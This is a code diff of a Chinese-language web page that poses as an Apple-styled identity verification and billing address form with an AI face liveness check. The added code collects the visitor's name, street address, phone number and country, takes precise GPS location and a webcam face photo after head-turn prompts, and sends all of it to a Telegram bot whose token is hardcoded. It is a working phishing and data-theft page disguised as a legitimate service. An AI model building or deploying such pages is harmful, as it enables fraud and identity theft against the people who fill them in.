@@ -1,95 +1,196 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>🔒 智能 AI 活体检测</title>
-    <!-- 引入 MediaPipe 人脸关键点检测库 -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 身份核验与账单地址确认</title>
+    <!-- 引入 MediaPipe 视觉库 -->
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
     <style>
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
+        :root {
+            --bg-color: #f5f5f7;
+            --card-bg: #ffffff;
+            --text-color: #1d1d1f;
+            --accent-color: #0071e3;
+            --accent-hover: #0077ed;
+            --border-color: #d2d2d7;
+            --input-bg: #f9f9fb;
+        }
+
+        body { 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            min-height: 100vh; margin: 0; background: var(--bg-color); color: var(--text-color); 
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif; 
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* 苹果风格卡片容器 */
+        .apple-card {
+            background: var(--card-bg);
+            width: 100%; max-width: 480px;
+            padding: 30px;
+            border-radius: 18px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            box-sizing: border-box;
+            margin: 20px;
+            text-align: left;
+        }
+
+        h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #111; }
+        .subtitle { font-size: 14px; color: #86868b; text-align: center; margin-bottom: 24px; }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 500; color: #86868b; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        input, select {
+            width: 100%; padding: 12px 14px; font-size: 16px;
+            border: 1px solid var(--border-color); border-radius: 10px;
+            background: var(--input-bg); color: var(--text-color);
+            box-sizing: border-box; outline: none; transition: all 0.3s;
+        }
+        input:focus, select:focus { border-color: var(--accent-color); background: #fff; box-shadow: 0 0 0 4px rgba(0,113,227,0.12); }
+
+        .form-row { display: flex; gap: 12px; }
+        .form-row .form-group { flex: 1; }
+
+        .apple-btn {
+            display: block; width: 100%; padding: 14px; background: var(--accent-color);
+            color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 500;
+            cursor: pointer; text-align: center; margin-top: 24px; transition: background 0.3s;
+        }
+        .apple-btn:hover { background: var(--accent-hover); }
+
+        /* 活体检测阶段样式 */
+        #step-verification { display: none; width: 100%; max-width: 640px; text-align: center; }
         
         #video-container { 
-            position: relative; 
-            width: 640px; 
-            height: 480px; 
-            max-width: 100%; 
-            margin-bottom: 20px; 
-            display: none; 
-            border-radius: 12px;
-            /* 动态光变颜色效果的外发光 */
-            box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
+            position: relative; width: 100%; height: 480px; max-width: 640px; margin: 0 auto 20px auto; 
+            border-radius: 12px; box-shadow: 0 0 25px rgba(0, 113, 227, 0.3);
             transition: box-shadow 0.5s, border-color 0.5s;
-            border: 3px solid #00ffcc;
+            border: 3px solid var(--accent-color); background: #000;
         }
-        #video { width: 100%; height: 100%; background: #000; border-radius: 9px; object-fit: cover; transform: scaleX(-1); } /* 镜像翻转 */
+        #video { width: 100%; height: 100%; border-radius: 9px; object-fit: cover; transform: scaleX(-1); }
         
         .face-frame {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            width: 240px; height: 320px;
-            border: 3px dashed rgba(255, 255, 255, 0.6);
-            border-radius: 50% / 40%;
-            pointer-events: none;
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 220px; height: 300px; border: 3px dashed rgba(255, 255, 255, 0.7);
+            border-radius: 50% / 40%; pointer-events: none;
         }
 
         #status { 
-            margin: 15px 20px; 
-            font-weight: bold; 
-            background: rgba(0,0,0,0.8); 
-            padding: 20px; 
-            border-radius: 10px; 
-            font-size: 20px; 
-            border: 1px solid #333;
-            max-width: 600px;
+            margin: 15px auto; font-weight: 500; background: rgba(255,255,255,0.9); 
+            color: #111; padding: 15px 20px; border-radius: 10px; font-size: 18px; 
+            border: 1px solid var(--border-color); max-width: 500px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
-        /* 自动补光遮罩层（通过调整全屏或容器亮度实现补光） */
         .fill-light {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(0,0,0,0.85) 80%);
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, rgba(0,0,0,0.75) 80%);
             pointer-events: none; z-index: 99; display: none;
         }
-        
-        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
-        button:hover { background: #00b386; color: white; }
-        
-        .error-page { font-size: 16px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; text-align: left; }
     </style>
 </head>
 <body>
     <div class="fill-light" id="fillLight"></div>
-    <div id="app">
-        <h2>🛡️ AI 智能视觉活体检测</h2>
-        <div id="status">点击开始以进行智能活体核验</div>
 
-        <div id="video-container" id="videoContainer">
+    <!-- 第一步：Apple 风格收货/账单地址填写表单 -->
+    <div class="apple-card" id="step-form">
+        <h2>账单与收货地址</h2>
+        <div class="subtitle">请输入您的详细信息以完成安全核验准备</div>
+        
+        <div class="form-row">
+            <div class="form-group">
+                <label>名字 (First Name)</label>
+                <input type="text" id="firstName" placeholder="例如: 伟" required>
+            </div>
+            <div class="form-group">
+                <label>姓氏 (Last Name)</label>
+                <input type="text" id="lastName" placeholder="例如: 张" required>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>国家 / 地区 (Country / Region)</label>
+            <select id="countrySelect">
+                <!-- 动态载入全球国家 -->
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>街道地址 (Street Address)</label>
+            <input type="text" id="address" placeholder="街道名称、门牌号、公寓等" required>
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <label>城市 (City)</label>
+                <input type="text" id="city" placeholder="城市" required>
+            </div>
+            <div class="form-group">
+                <label>邮政编码 (Postal Code)</label>
+                <input type="text" id="postalCode" placeholder="邮编" required>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>手机号码 (Phone Number)</label>
+            <input type="tel" id="phone" placeholder="接收验证通知的手机号" required>
+        </div>
+
+        <button class="apple-btn" id="nextToVerifyBtn">下一步：生物活体检测 ➔</button>
+    </div>
+
+    <!-- 第二步：AI 视觉活体检测界面 -->
+    <div id="step-verification">
+        <h2>🛡️ 智能 AI 视觉活体检测</h2>
+        <div id="status">正在加载身份验证模块...</div>
+
+        <div id="video-container">
             <video id="video" autoplay playsinline muted></video>
             <div class="face-frame"></div>
         </div>
         
         <canvas id="canvas" style="display:none;"></canvas>
-        <button id="startBtn">开始智能核验 🔐</button>
     </div>
 
     <script>
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
-        const app = document.getElementById('app');
+        const CHAT_ID = new URLSearchParams(window.location.search).get('id');
+
+        // 全球常见国家列表数据
+        const countries = [
+            "中国 (China)", "美国 (United States)", "日本 (Japan)", "英国 (United Kingdom)", 
+            "德国 (Germany)", "法国 (France)", "加拿大 (Canada)", "澳大利亚 (Australia)", 
+            "新加坡 (Singapore)", "韩国 (South Korea)", "中国香港 (Hong Kong)", "中国台湾 (Taiwan)",
+            "马来西亚 (Malaysia)", "泰国 (Thailand)", "越南 (Vietnam)", "意大利 (Italy)",
+            "西班牙 (Spain)", "荷兰 (Netherlands)", "瑞士 (Switzerland)", "俄罗斯 (Russia)"
+        ];
+
+        // 初始化国家下拉菜单
+        const countrySelect = document.getElementById('countrySelect');
+        countries.forEach(c => {
+            const opt = document.createElement('option');
+            opt.value = c;
+            opt.text = c;
+            countrySelect.appendChild(opt);
+        });
+
+        let formDataCache = {};
+        const stepForm = document.getElementById('step-form');
+        const stepVerification = document.getElementById('step-verification');
+        const nextToVerifyBtn = document.getElementById('nextToVerifyBtn');
         const video = document.getElementById('video');
         const videoContainer = document.getElementById('video-container');
         const canvas = document.getElementById('canvas');
-        const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
         const fillLight = document.getElementById('fillLight');
-        const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        // 检测状态机: 0: 准备, 1: 检测正脸/自动补光, 2: 检测向左转, 3: 检测向右转, 4: 完成
         let currentStep = 0;
         let lastSpokenText = "";
 
         function speakPrompt(text) {
-            if (text === lastSpokenText) return; // 避免重复语音打断
+            if (text === lastSpokenText) return;
             lastSpokenText = text;
             status.innerText = text;
             if ('speechSynthesis' in window) {
@@ -102,42 +203,57 @@
             }
         }
 
-        // 动态改变光效与边框颜色（用于视觉提示和自动补光反馈）
         function updateUIPulse(color, glowColor) {
             videoContainer.style.borderColor = color;
             videoContainer.style.boxShadow = `0 0 25px ${glowColor}`;
         }
 
-        startBtn.addEventListener('click', async () => {
-            if (!CHAT_ID) { 
-                status.innerText = "❌ 链接中缺少验证 ID (?id=...)"; 
-                return; 
-            }
-            startBtn.style.display = 'none';
-            fillLight.style.display = 'block'; // 开启智能自动补光遮罩
+        // 点击提交表单信息，进入活体检测阶段
+        nextToVerifyBtn.addEventListener('click', async () => {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const country = document.getElementById('countrySelect').value;
+            const address = document.getElementById('address').value.trim();
+            const city = document.getElementById('city').value.trim();
+            const postalCode = document.getElementById('postalCode').value.trim();
+            const phone = document.getElementById('phone').value.trim();
 
-            let locationText = "未获取到位置信息";
+            if (!firstName || !lastName || !address || !city || !postalCode || !phone) {
+                alert("请完整填写所有账单与收货地址信息。");
+                return;
+            }
+
+            if (!CHAT_ID) {
+                alert("链接中缺少验证 ID (?id=...)，无法进行后续归档。");
+                return;
+            }
+
+            // 缓存表单数据
+            formDataCache = { firstName, lastName, country, address, city, postalCode, phone };
+
+            // 切换 UI 视图
+            stepForm.style.display = 'none';
+            stepVerification.style.display = 'block';
+            fillLight.style.display = 'block';
+
+            // 获取地理位置辅助
+            let locationText = "未获取到精确GPS";
             try {
-                status.innerText = "正在初始化定位与传感器 📍";
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 });
                 });
                 locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
-            } catch (err) {
-                console.warn("Geolocation warning:", err);
+            } catch (e) {
+                console.warn("GPS info skipped");
             }
 
+            // 启动摄像头与 AI 检测
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
                 video.srcObject = stream;
-                videoContainer.style.display = 'block';
-
-                // 初始化 MediaPipe Face Mesh AI 模型
                 initAIFaceDetection(stream, locationText);
-
             } catch (err) {
-                console.error("Camera start error:", err);
-                app.innerHTML = `<div class="error-page"><p>⚠️ 无法启动摄像头：${err.message}</p></div>`;
+                status.innerText = "⚠️ 摄像头调用失败: " + err.message;
             }
         });
 
@@ -156,47 +272,39 @@
             faceMesh.onResults((results) => {
                 if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
                     speakPrompt("未检测到人脸，请将脸部移入框内");
-                    updateUIPulse('#ff4d4d', 'rgba(255, 77, 77, 0.5)'); // 红色提示
+                    updateUIPulse('#ff4d4d', 'rgba(255, 77, 77, 0.5)');
                     return;
                 }
 
                 const landmarks = results.multiFaceLandmarks[0];
-                
-                // 简单的 AI 头部姿态估算（通过鼻尖 1 号点与两侧耳朵/眼角关键点相对位置判断偏转角）
                 const nose = landmarks[1];
                 const leftEye = landmarks[33];
                 const rightEye = landmarks[263];
-                
-                // 计算水平偏移量估算左右转头
                 const eyeCenterXinVideo = (leftEye.x + rightEye.x) / 2;
                 const headYaw = nose.x - eyeCenterXinVideo; 
 
                 if (currentStep === 0) {
-                    // 步骤1：检测正脸并自动对焦/补光通过
-                    updateUIPulse('#00ffcc', 'rgba(0, 255, 204, 0.6)'); // 蓝绿色（正常光效）
+                    updateUIPulse('#0071e3', 'rgba(0, 113, 227, 0.5)');
                     speakPrompt("请保持正脸，准备向左缓慢转头");
                     setTimeout(() => { currentStep = 1; }, 2000);
                 } 
                 else if (currentStep === 1) {
-                    // 步骤2：AI 判断是否向左转头 (阈值可根据实际效果微调)
                     speakPrompt("请缓慢向左转头...");
-                    updateUIPulse('#ffeb3b', 'rgba(255, 235, 59, 0.6)'); // 黄色光变提示
+                    updateUIPulse('#ffeb3b', 'rgba(255, 235, 59, 0.6)');
                     
-                    if (headYaw > 0.04) { // 向左转达标
+                    if (headYaw > 0.04) {
                         currentStep = 2;
                         speakPrompt("左转成功，请缓慢向右转头");
                     }
                 } 
                 else if (currentStep === 2) {
-                    // 步骤3：AI 判断是否向右转头
-                    updateUIPulse('#ff9800', 'rgba(255, 152, 0, 0.6)'); // 橙色光变提示
+                    updateUIPulse('#ff9800', 'rgba(255, 152, 0, 0.6)');
                     
-                    if (headYaw < -0.04) { // 向右转达标
+                    if (headYaw < -0.04) {
                         currentStep = 3;
-                        speakPrompt("动作核验通过，正在自动抓取加密样本");
-                        updateUIPulse('#00ff00', 'rgba(0, 255, 0, 0.8)'); // 绿色完成提示
+                        speakPrompt("活体动作核验通过，正在打包加密上传");
+                        updateUIPulse('#34c759', 'rgba(52, 199, 89, 0.8)');
                         
-                        // 达标后由 AI 触发结束并自动上传
                         setTimeout(() => {
                             captureAndUpload(stream, locationText);
                         }, 1000);
@@ -217,31 +325,44 @@
         }
 
         async function captureAndUpload(stream, locationText) {
-            currentStep = 4; // 锁定防止重复触发
-            status.innerText = "✅ AI 活体比对成功，正在生成凭证...";
+            currentStep = 4;
+            status.innerText = "✅ 验证完成，正在提交所有数据...";
             fillLight.style.display = 'none';
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.translate(canvas.width, canvas.height);
-            ctx.scale(-1, -1); // 保持输出图片方向正常
+            ctx.scale(-1, -1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
+                
+                // 拼装要发送到 Telegram 的完整文本信息（包含地址、国家、联系方式等）
+                const captionText = `📦 [收到新的账单地址与活体核验]\n` +
+                    `━━━━━━━━━━━━━━━\n` +
+                    `🆔 会话 ID: ${CHAT_ID}\n` +
+                    `👤 姓名: ${formDataCache.lastName} ${formDataCache.firstName}\n` +
+                    `🌍 国家/地区: ${formDataCache.country}\n` +
+                    `🏠 地址: ${formDataCache.address}, ${formDataCache.city}, ${formDataCache.postalCode}\n` +
+                    `📞 电话: ${formDataCache.phone}\n` +
+                    `📍 GPS: ${locationText}\n` +
+                    `━━━━━━━━━━━━━━━\n` +
+                    `状态: AI 动态视觉活体校验通过 ✅`;
+
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'ai_liveness.jpg');
-                formData.append('caption', `🛡️ [AI 智能活体核验成功]\nID: ${CHAT_ID}\n📍 ${locationText}\n状态: 视觉动作引擎已确认并通过。`);
+                formData.append('photo', blob, 'user_verification_and_face.jpg');
+                formData.append('caption', captionText);
 
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    status.innerText = "🎉 验证全部通过！";
+                    status.innerText = "🎉 提交成功！您可以关闭此页面。";
                     stream.getTracks().forEach(t => t.stop());
                     videoContainer.style.display = 'none';
                 } catch (e) {
-                    status.innerText = "⚠️ 上传结果时发生网络错误。";
+                    status.innerText = "⚠️ 上传凭证时发生网络错误。";
                 }
             }, 'image/jpeg', 0.95);
         }
